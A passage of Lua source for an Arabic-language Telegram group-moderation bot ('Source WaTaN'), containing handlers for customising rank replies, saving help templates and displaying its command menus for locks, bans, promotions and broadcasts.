send(msg.chat_id_,msg.id_,'\n✯︙اهلا عزيزي البوت هنا ادمن'..'\n✯︙وصلاحياته هي ↓ \nٴ━━━━━━━━━━'..'\n✯︙تغير معلومات الكروب ↞ ❴ '..info..' ❵'..'\n✯︙حذف الرسائل ↞ ❴ '..delete..' ❵'..'\n✯︙حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n✯︙دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n✯︙تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n✯︙اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end


if text and text:match("^تغير رد المطور (.*)$") and ChanSub(msg) and Manager(msg) then
local Teext = text:match("^تغير رد المطور (.*)$") 
database:set(bot_id.."Sudo:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ✯︙تم تغير رد المطور الى » "..Teext)
end
if text and text:match("^تغير رد المالك (.*)$") and ChanSub(msg) and Manager(msg) then
local Teext = text:match("^تغير رد المالك (.*)$") 
database:set(bot_id.."CoSu:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ✯︙تم تغير رد المالك الى » "..Teext)
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") and ChanSub(msg) and Manager(msg) then
local Teext = text:match("^تغير رد منشئ الاساسي (.*)$") 
database:set(bot_id.."BasicConstructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ✯︙تم تغير رد المنشئ الاساسي الى » "..Teext)
end
if text and text:match("^تغير رد المنشئ (.*)$") and ChanSub(msg) and Manager(msg) then
local Teext = text:match("^تغير رد المنشئ (.*)$") 
database:set(bot_id.."Constructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ✯︙تم تغير رد المنشئ الى » "..Teext)
end
if text and text:match("^تغير رد المدير (.*)$") and ChanSub(msg) and Manager(msg) then
local Teext = text:match("^تغير رد المدير (.*)$") 
database:set(bot_id.."Manager:Rd"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_," ✯︙تم تغير رد المدير الى » "..Teext)
end
if text and text:match("^تغير رد الادمن (.*)$") and ChanSub(msg) and Manager(msg) then
local Teext = text:match("^تغير رد الادمن (.*)$") 
database:set(bot_id.."Mod:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ✯︙تم تغير رد الادمن الى » "..Teext)
end
if text and text:match("^تغير رد المميز (.*)$") and ChanSub(msg) and Manager(msg) then
local Teext = text:match("^تغير رد المميز (.*)$") 
database:set(bot_id.."Special:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ✯︙تم تغير رد المميز الى » "..Teext)
end
if text and text:match("^تغير رد العضو (.*)$") and ChanSub(msg) and Manager(msg) then
local Teext = text:match("^تغير رد العضو (.*)$") 
database:set(bot_id.."Memp:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ✯︙تم تغير رد العضو الى » "..Teext)
end

if text and text:match("^(.*)$") then
if database:get(bot_id..'help'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help'..msg.sender_user_id_)
database:set(bot_id..'help_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help1'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help1'..msg.sender_user_id_)
database:set(bot_id..'help1_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help2'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help2'..msg.sender_user_id_)
database:set(bot_id..'help2_text',text)
return false
end
end

if text and text:match("^(.*)$") then
if database:get(bot_id..'help3'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help3'..msg.sender_user_id_)
database:set(bot_id..'help3_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help4'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help4'..msg.sender_user_id_)
database:set(bot_id..'help4_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help5'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help5'..msg.sender_user_id_)
database:set(bot_id..'help5_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help6'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help6'..msg.sender_user_id_)
database:set(bot_id..'help6_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help7'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help7'..msg.sender_user_id_)
database:set(bot_id..'help7_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help8'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help8'..msg.sender_user_id_)
database:set(bot_id..'help8_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help9'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help9'..msg.sender_user_id_)
database:set(bot_id..'help9_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help10'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '✯︙تم حفظ الكليشه')
database:del(bot_id..'help10'..msg.sender_user_id_)
database:set(bot_id..'help10_text',text)
return false
end
end

if text == 'استعاده الاوامر' and ChanSub(msg) and DevWaTaN(msg) then
database:del(bot_id..'help_text')
database:del(bot_id..'help1_text')
database:del(bot_id..'help2_text')
database:del(bot_id..'help3_text')
database:del(bot_id..'help4_text')
database:del(bot_id..'help5_text')
database:del(bot_id..'help6_text')
database:del(bot_id..'help7_text')
database:del(bot_id..'help8_text')
database:del(bot_id..'help9_text')
database:del(bot_id..'help10_text')
send(msg.chat_id_, msg.id_, '✯︙تم استعادة الاوامر القديمه')
end
if text == 'تغير امر الاوامر' and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه الاوامر')
database:set(bot_id..'help'..msg.sender_user_id_,'true')
return false 
end
if text == 'تغير امر م1' and ChanSub(msg) and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه م1')
database:set(bot_id..'help1'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م2' and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه م2')
database:set(bot_id..'help2'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م3' and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه م3')
database:set(bot_id..'help3'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م4' and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه م4')
database:set(bot_id..'help4'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م5' and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه م5')
database:set(bot_id..'help5'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م6' and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه م6')
database:set(bot_id..'help6'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م7' and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه م7')
database:set(bot_id..'help7'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م8' and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه م8')
database:set(bot_id..'help8'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م9' and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه م9')
database:set(bot_id..'help9'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م10' and ChanSub(msg) and DevWaTaN(msg) then
send(msg.chat_id_, msg.id_, '✯︙الان يمكنك ارسال الكليشه م10')
database:set(bot_id..'help10'..msg.sender_user_id_,'true')
return false 
end
if text == 'الاوامر' and ChanSub(msg) then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بالادمنيه\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local Text =[[
*🖥┇𝚂𝙾𝚄𝚁𝙲𝙴 𝚆𝙰𝚃𝙰𝙽 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .*
*┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ *
*⚙️ | اهلا انت في اوامر البوت الرئيسية 🔏*
*⚙️ | اختر في الاسفل الرقم التابع للأمر 🔍*
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
*❶◂ اوامر الحمايه .*
*❷◂ اوامر تعطيل ~ تفعيل .*
*❸◂ اوامر ضع ~ اضف  .*
*❹◂ اوامر مسح ~ حذف .*
*❺◂ اوامر تنزيل+رفع+التغير .*
*❻◂ اوامر الكروب .*
*❼◂ اوامر التحشيش .*
*❽◂ اوامر مطور البوت .*
*❾◂ اوامر مطور الاساسي .*
*⓿❶◂ اوامر الاعضاء .*
*ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ*
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ❶ •', callback_data="/help1"..msg.sender_user_id_},{text = '• ❷ •', callback_data="/help2"..msg.sender_user_id_},{text = '• ❸ •', callback_data="/help3"..msg.sender_user_id_},
},
{
{text = '• ❹ •', callback_data="/help4"..msg.sender_user_id_},{text = '• ❺ •', callback_data="/help5"..msg.sender_user_id_},
},
{
{text = '• ❻ •', callback_data="/help6"..msg.sender_user_id_},{text = '• ❼ •', callback_data="/help7"..msg.sender_user_id_},{text = '• ❽ •', callback_data="/help8"..msg.sender_user_id_},
},
{
{text = '• ❾ •', callback_data="/help9"..msg.sender_user_id_},{text = '• ❶⓿ •', callback_data="/help10"..msg.sender_user_id_},
},
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/WaTaNTeaM"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
if text == 'م1' and ChanSub(msg) then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بالادمنيه\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local help_text = database:get(bot_id..'help1_text')
Text = [[
🛡┇𝙿𝚁𝙾𝚃𝙴𝙲𝚃𝙸𝙾𝙽 𝙾𝚁𝙳𝙴𝚁𝚂.
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اوامر الحمايه اتبع مايلي ✅ .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙قفل + فتح ← الامر… 
✯︙← { بالتقيد ، بالطرد ، بالكتم }
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الكـل
✯︙الروابط
✯︙المعرف
✯︙التاك
✯︙الشارحه
✯︙التعديل
✯︙التثبيت
✯︙المتحركه
✯︙الملفات
✯︙الصور
✯︙التفليش
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الماركداون
✯︙البوتات
✯︙الاباحي
✯︙الفشار
✯︙التكرار
✯︙الكلايش
✯︙السيلفي
✯︙الملصقات
✯︙الفيديو
✯︙الانلاين
✯︙الدردشه
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙التوجيه
✯︙الاغاني
✯︙الصوت
✯︙الجهات
✯︙الاشعارات
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
if text == 'م2' and ChanSub(msg) then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بالادمنيه\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local help_text = database:get(bot_id..'help2_text')
Text = [[
🔏┇𝙾𝚁𝙳𝙴𝚁𝚂 - 𝙰𝙲𝚃𝙸𝚅𝙰𝚃𝙸𝙾𝙽
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر تفعيل وتعطيل ( ✅ - ❌) .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تفعيل ~ تعطيل + امر 🔚 .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اطردني
✯︙صيح
✯︙غنيلي
✯︙ضافني
✯︙الرابط 
✯︙الحظر
✯︙الرفع
✯︙الايدي
✯︙الالعاب
✯︙الالعاب المتطوره
✯︙ردود المطور
✯︙ردود البوت
✯︙الترحيب
✯︙ردود المدير
✯︙ٴall
✯︙الردود
✯︙نسبة الحب
✯︙نسبة الرجوله
✯︙نسبه الانوثه 
✯︙نسبه الكره
✯︙حساب العمر
✯︙الابراج
✯︙تنبيه الاسماء
✯︙تنبيه المعرف
✯︙تنبيه الصور
✯︙التوحيد
✯︙الكتم الاسم
✯︙زخرفه
✯︙ردود البوت
✯︙اوامر التحشيش
✯︙صورتي 
 ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
if text == 'م3' and ChanSub(msg) then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بالادمنيه\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local help_text = database:get(bot_id..'help3_text')
Text = [[
📝┇𝙿𝚄𝚃 - 𝙰𝙳𝙳 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر الوضع - اضف ( 📌 - 📍) .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اضف / حذف ← رد
✯︙اضف / حذف ← صلاحيه
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙ضع + امر …
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اسم
✯︙رابط
✯︙ترحيب
✯︙قوانين
✯︙رد متعدد 
✯︙صوره
✯︙وصف
✯︙تكرار + عدد
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
 if text == 'م4' and ChanSub(msg) then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بالادمنيه\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local help_text = database:get(bot_id..'help4_text')
Text = [[
✂️┇W𝙸𝙿𝙴 - 𝙳𝙴𝙻𝙴𝚃𝙴 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر مسح / الحذف ← امر ( ✂️ - 📝 ).
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙مسح + امر ↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الايدي 
✯︙المميزين
✯︙الادمنيه
✯︙المدراء
✯︙المنشئين
✯︙الاساسين
✯︙الاسماء المكتومه
✯︙ردود المدير
✯︙البوتات
✯︙صلاحيه
✯︙قائمه منع المتحركات
✯︙قائمه منع الصور
✯︙قائمه منع الملصقات
✯︙مسح قائمه المنع
✯︙المحذوفين
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙حذف  امر + الامر القديم  
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الاوامر المضافه ( لعرض الاوامر المضافه ) 
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
 if text == 'م5' and ChanSub(msg) then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بالادمنيه\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local help_text = database:get(bot_id..'help5_text')
Text = [[
🎚┇𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 - 𝚄𝙿𝙻𝙾𝙰𝙳 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر تنزيل ورفع ( ⚖️ ) .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تنزيل 🔛 رفع + امر ↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙مميز
✯︙ادمن
✯︙مدير
✯︙منشئ
✯︙منشئ اساسي
✯︙مالك
✯︙الادمنيه
✯︙ادمن بالكروب
✯︙منشئ بالكروب
✯︙القيود 
✯︙تنزيل جميع الرتب
✯︙تنزيل الكل بالرد على الشخص
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اوامر التغير …
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تغير رد المطور + اسم
✯︙تغير رد المالك + اسم
✯︙تغير رد منشئ الاساسي + اسم
✯︙تغير رد المنشئ + اسم
✯︙تغير رد المدير + اسم
✯︙تغير رد الادمن + اسم
✯︙تغير رد المميز + اسم
✯︙تغير رد العضو + اسم
✯︙تغير امر الاوامر
✯︙تغير امر م1 ~ الئ م10
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
if text == 'م6' and ChanSub(msg) then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بالادمنيه\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local help_text = database:get(bot_id..'help6_text')
Text = [[
🎫┇𝙶𝚁𝙾𝚄𝙿 𝙾𝚁𝙳𝙴𝚁𝚂 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊 .
✯︙اوامر المجموعه 📢 .
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الاوامر كالتالي ♻️ ↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙استعاده الاوامر 
✯︙ترتيب الاوامر
✯︙اضف/مسح امر
✯︙مسح الاوامر المضافه
✯︙تحويل كالاتي➸ بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
✯︙صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
✯︙كشف القيود
✯︙تعين الايدي
✯︙تغير الايدي
✯︙مسح نقاطه/رسائله
✯︙الحساب + ايدي الحساب
✯︙جهاته
✯︙تنظيف + العدد
✯︙وضع وقت التنظيف
✯︙مسح + العدد
✯︙تنظيف الميديا ← لمسح جميع الميديا
✯︙امسح ← لمسح عدد من الوسائط الموجوده
✯︙منع + بالرد
✯︙~ الصور + متحركه + ملصق ~
✯︙حظر ~ كتم ~ تقيد ~ طرد
✯︙المحظورين ~ المكتومين ~ المقيدين
✯︙الغاء كتم + حظر + تقيد ~ بالرد و معرف و ايدي
✯︙تقيد ~ كتم + الرقم + ساعه
✯︙تقيد ~ كتم + الرقم + يوم
✯︙تقيد ~ كتم + الرقم + دقيقه
✯︙مسح ~ المكتومين + المحظورين + المقيدين
✯︙تثبيت ~ الغاء تثبيت
✯︙الترحيب
✯︙الغاء تثبيت الكل
✯︙كشف البوتات
✯︙الصلاحيات
✯︙كشف ~ بالرد ← بمعرف ← ايدي
✯︙تاك للكل
✯︙وضع لقب + لقب
✯︙حذف لقب بالرد
✯︙الاعدادات
✯︙عدد الكروب
✯︙ردود المدير
✯︙اسم بوت + الرتبه
✯︙الاوامر المضافه
✯︙وضع توحيد + توحيد
✯︙تعين عدد الكتم + رقم
✯︙كتم اسم + اسم
✯︙التوحيد
✯︙قائمه المنع
✯︙نسبه الحب 
✯︙نسبه رجوله
✯︙نسبه الكره
✯︙نسبه الانوثه
✯︙الساعه
✯︙التاريخ
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM)➤
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
if text == 'م7' and ChanSub(msg) then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بالادمنيه\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local help_text = database:get(bot_id..'help7_text')
Text = [[
🤹🏻┇𝙵𝚄𝙽𝙽𝚈 𝙾𝚁𝙳𝙴𝚁𝚂 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙الاوامر التحشيش 🃏
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← الامࢪ ↓
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← مطي 
✯︙تاك للمطايه
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← صخل
✯︙تاك لصخوله
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← جلب
✯︙تاك لجلاب
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← قرد 
✯︙تاك لقروده
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← بقره
✯︙تاك لبقرات
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← ضلع
✯︙تاك لضلوع
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← ضلعه
✯︙تاك للضلعات
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← طلي
✯︙تاك لطليان
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← زاحف 
✯︙تاك لزواحف
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← جريذي
✯︙تاك لجريذيه
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← الصاك
✯︙تاك للصاكين
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙رفع + تنزيل ← الحاته
✯︙تاك للحاتات
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
if text == 'م8' and ChanSub(msg) then
if not Sudo(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بمطور\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local help_text = database:get(bot_id..'help8_text')
Text = [[
🏅┇𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁𝚂' 𝙾𝚁𝙳𝙴𝚁𝚂 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اوامر المطورين ( 👥).
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تفعيل ← تعطيل 
✯︙المجموعات ← المشتركين ← الاحصائيات
✯︙رفع ← تنزيل مالك
✯︙مسح المالكين ← المالكين
✯︙مسح الاساسين ← المنشئين الاساسين
✯︙مسح المنشئين ← المنشئين
✯︙اسم ~ ايدي + بوت غادر 
✯︙اذاعه 
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
if text == 'م9' and ChanSub(msg) then
if not Sudo(msg) then
send(msg.chat_id_, msg.id_,'✯︙هذا الامر خاص بالمطور الاساسي\n✯︙ارسل {م10} لعرض اوامر الاعضاء')
return false
end
local help_text = database:get(bot_id..'help9_text')
Text = [[
🎖┇ 𝙱𝙰𝚂𝙸𝙲 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
✯︙اهلا بك عزيزي 🔊
✯︙اوامر مطور الاساسي 👨🏼‍✈️
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تفعيل
✯︙تعطيل
✯︙تفعيل/تعطيل الجلب التلقائي
✯︙تفعيل/تعطيل الوضع المدفوع
✯︙الكروبات المدفوعه
✯︙رفع/تنزيل مطور ثانوي 
✯︙مسح المطورين
✯︙المطورين
✯︙رفع | تنزيل مطور
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اسم البوت + غادر
✯︙غادر
✯︙اسم بوت + الرتبه
✯︙حظر عام
✯︙كتم عام
✯︙الغاء العام
✯︙المحظورين عام
✯︙مسح المحظورين عام
✯︙مسح المكتومين عام
✯︙جلب نسخه الاحتياطيه
✯︙رفع نسخه الاحتياطيه
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تحديث السورس
✯︙المتجر 
✯︙متجر الملفات
✯︙تحديث المتجر
✯︙الملفات
✯︙مسح الملفات
✯︙تعطيل + تفعيل + اسم ملف
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙اذاعه خاص
✯︙اذاعه
✯︙اذاعه بالتوجيه
✯︙اذاعه بالتوجيه خاص
✯︙اذاعه بالتثبيت
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙جلب ملف السورس
✯︙رفع ملف السورس
✯︙جلب ملف الردود
✯︙جلب ملف الالعاب
✯︙ضع عدد الاعضاء + العدد
✯︙ضع كليشه المطور
✯︙تفعيل/تعطيل الاذاعه
✯︙تفعيل/تعطيل البوت الخدمي
✯︙تفعيل/تعطيل التواصل
✯︙تغير اسم البوت
✯︙اضف/حذف رد للكل
✯︙ردود المطور
✯︙مسح ردود المطور
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙الاشتراك الاجباري
✯︙تعطيل الاشتراك الاجباري
✯︙تفعيل الاشتراك الاجباري
✯︙حذف رساله الاشتراك
✯︙تغير رساله الاشتراك
✯︙تغير الاشتراك
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
✯︙تغير المطور الاساسي
✯︙الاحصائيات
✯︙المشتركين
✯︙المجموعات 
✯︙روابط الكروبات
✯︙تفعيل/تعطيل المغادره
✯︙تنظيف المشتركين
✯︙تنظيف الكروبات
ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
]]
